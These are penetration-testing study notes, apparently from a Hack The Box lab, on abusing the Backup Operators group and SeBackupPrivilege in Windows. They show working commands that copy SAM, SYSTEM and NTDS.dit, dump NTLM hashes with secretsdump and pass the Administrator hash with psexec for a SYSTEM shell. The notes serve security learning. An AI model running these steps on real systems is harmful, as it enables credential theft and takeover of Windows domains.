# <span style="color:#FF5555">Windows Built-in Groups</span>


## <span style="color:#8BE9FD">🏢 Windows Built-in Groups</span>

- Windows servers and Domain Controllers have **built-in groups** that grant special rights.
- These groups exist from Server 2008 R2 onward (except Hyper-V Admins from Server 2012).
- Group membership often gives privileges useful for specific tasks (e.g., backup, printing).
- Sometimes service accounts or vendor apps are members.
- Always check group membership to identify possible privilege escalation paths.


### <span style="color:#50FA7B">Important Groups to Know:</span>
- **Backup Operators**
- Event Log Readers
- DnsAdmins
- Hyper-V Administrators
- Print Operators
- Server Operators


## <span style="color:#8BE9FD">💼 Backup Operators Group & SeBackupPrivilege</span>

- Being in **Backup Operators** gives two key privileges:
  - **SeBackupPrivilege**: Backup files/folders (read anything).
  - **SeRestorePrivilege**: Restore files/folders.

- **SeBackupPrivilege** lets you read and copy files **even if ACL denies access**.


## <span style="color:#8BE9FD">🧪 Using SeBackupPrivilege to Copy Protected Files</span>


### <span style="color:#50FA7B">Step 1: Check Your Group Membership</span>

```powershell
whoami /groups
```

Look for membership in **Backup Operators**.


### <span style="color:#50FA7B">Step 2: Check if SeBackupPrivilege is Enabled</span>

```powershell
whoami /priv
Get-SeBackupPrivilege
```

If `SeBackupPrivilege` is **Disabled**, enable it:

```powershell
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```

*Note:* You may need an **elevated (admin) command prompt**.


### <span style="color:#50FA7B">Step 3: Copy a Protected File Using SeBackupPrivilege Cmdlet</span>

Example: The file `C:\Confidential\2021 Contract.txt` is denied for normal reading.

```powershell
cat 'C:\Confidential\2021 Contract.txt'
# Access denied error

Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
cat .\Contract.txt
# File content is now readable
```

## <span style="color:#8BE9FD">OR  copy using robocopy</span>
```
robocopy "C:\Users\Administrator\Desktop" "C:\Temp" "root.txt" /B
```
# <span style="color:#FF5555">Window Registery (Administrator hash)</span>
SeBackupPrivilege is an instant win. We can copy the sam and system registry values and pass the Administrator hash.
```bash
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> reg save hklm\system C:\temp\system.hive 
The operation completed successfully.

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> reg save hklm\sam C:\temp\sam.hive
The operation completed successfully.

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> cd C:\temp
*Evil-WinRM* PS C:\temp> download sam.hive
                                        
Info: Downloading C:\temp\sam.hive to sam.hive
                                        
Info: Download successful!
*Evil-WinRM* PS C:\temp> download system.hive
                                        
Info: Downloading C:\temp\system.hive to system.hive
                                        
Info: Download successful!
*Evil-WinRM* PS C:\temp>
```
Now back at the attacker, I can use `impacket-secretsdump` to well, dump the secrets.
```
┌──(kali㉿kali)-[~/…/htb/writeups/cicada/loot]
└─$ impacket-secretsdump -sam sam.hive -system system.hive local
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up...
```

Thanks to windows and it's silliness, I can just pass the administrator hash using impacket-psexec and have a shell as system.

```
┌──(kali㉿kali)-[~/…/htb/writeups/cicada/loot]
└─$ impacket-psexec $DOMAIN/Administrator@$VICTIM_IP -hashes 'aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on $VICTIM_IP.....
[*] Found writable share ADMIN$
[*] Uploading file DgNSqBjx.exe
[*] Opening SVCManager on $VICTIM_IP.....
[*] Creating service RURf on $VICTIM_IP.....
[*] Starting service RURf.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.2700]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```



___
# <span style="color:#FF5555">Attacking a Domain Controller with SeBackupPrivilege</span>


### <span style="color:#50FA7B">Why Target the Domain Controller?</span>

- The **NTDS.dit** file contains the Active Directory database with all user and computer hashes.
- It is **locked** and inaccessible normally.


### <span style="color:#50FA7B">Step 1: Create a Shadow Copy with DiskShadow</span>

```powershell
diskshadow.exe

# Inside diskshadow console:
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
exit
```

Now `E:` is a snapshot of the `C:` drive, including the NTDS.dit file.


### <span style="color:#50FA7B">Step 2: Copy NTDS.dit Locally Using SeBackupPrivilege</span>

```powershell
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```


### <span style="color:#50FA7B">Step 3: Back Up SAM and SYSTEM Registry Hives</span>

```powershell
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```

These files can be used to extract local account credentials offline.


## <span style="color:#8BE9FD">🔍 Extracting Credentials</span>

- Use tools like **DSInternals PowerShell** or **Impacket secretsdump.py**.

### <span style="color:#50FA7B">DSInternals example:</span>

```powershell
Import-Module .\DSInternals.psd1
$key = Get-BootKey -SystemHivePath .\SYSTEM
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=domain,DC=local' -DBPath .\ntds.dit -BootKey $key
```


### <span style="color:#50FA7B">secretsdump.py example:</span>

```bash
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

This extracts NTLM hashes which can be cracked offline or used in pass-the-hash attacks.


## <span style="color:#8BE9FD">🛠 Using Robocopy in Backup Mode</span>

Instead of external tools, use **robocopy** with the `/B` (backup mode) flag to copy locked files.

```powershell
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```

This copies the `ntds.dit` file from the shadow copy.
